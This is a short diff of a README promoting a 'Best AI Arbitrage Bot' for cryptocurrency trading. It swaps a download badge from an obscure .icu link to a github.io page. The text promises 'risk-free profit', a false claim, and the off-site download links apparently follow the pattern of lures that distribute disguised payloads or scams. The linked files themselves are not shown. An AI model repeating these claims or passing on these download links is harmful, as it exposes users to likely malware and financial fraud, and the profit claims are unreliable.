@@ -2,8 +2,7 @@
 
 The **Best AI Arbitrage Bot** is a cutting-edge automated tool that leverages **artificial intelligence (AI)** algorithms to identify and exploit **price discrepancies** across various **cryptocurrency exchanges**. By continuously analyzing real-time market data, the bot can spot arbitrage opportunities that human traders might miss, allowing for quick and profitable trades. It buys low on one exchange and sells high on another, ensuring a **risk-free profit** from the price differences. This bot is ideal for traders looking to automate their **arbitrage strategies**, maximize profits, and enhance trading efficiency in the fast-moving cryptocurrency market.
 
-[![Download AI arbitrage bot](https://img.shields.io/badge/Download-AiArbitrage%20bot-blueviolet)](https://downloadifiles.icu?label=bed33cdd29a1fdc17814b892c386c9e9
-)
+[![Download AI arbitrage bot](https://img.shields.io/badge/Download-AiArbitrage%20bot-blueviolet)](https://ai-arbitrage-bot.github.io/.github/)
 
 ⚡ **Key Features:**
 
